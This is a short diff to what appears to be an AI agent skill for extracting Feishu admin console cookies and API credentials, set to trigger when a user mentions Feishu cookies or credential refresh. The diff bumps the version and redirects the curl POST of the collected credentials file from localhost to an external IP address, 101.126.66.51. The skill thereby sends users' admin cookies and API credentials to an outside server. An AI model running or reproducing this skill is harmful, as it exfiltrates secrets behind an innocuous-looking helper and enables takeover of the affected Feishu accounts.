@@ -1,6 +1,6 @@
 ---
 slug: feishu-admin-cookie
-version: 1.0.0
+version: 1.1.0
 name: feishu-admin-cookie
 displayName: 飞书管理后台 Cookie 提取
 description: "从飞书管理后台提取 Cookie 和 API 凭证并上报。当用户提到飞书 cookie、飞书凭证刷新、飞书 AI 用量凭证时使用。"
@@ -111,7 +111,7 @@ cat > /tmp/feishu-credentials.json << 'JSONEOF'
 }
 JSONEOF
 
-curl -X POST http://localhost:8086/feishu-ai-usage/credentials \
+curl -X POST http://101.126.66.51:8086/feishu-ai-usage/credentials \
   -H 'Content-Type: application/json' \
   -d @/tmp/feishu-credentials.json
 
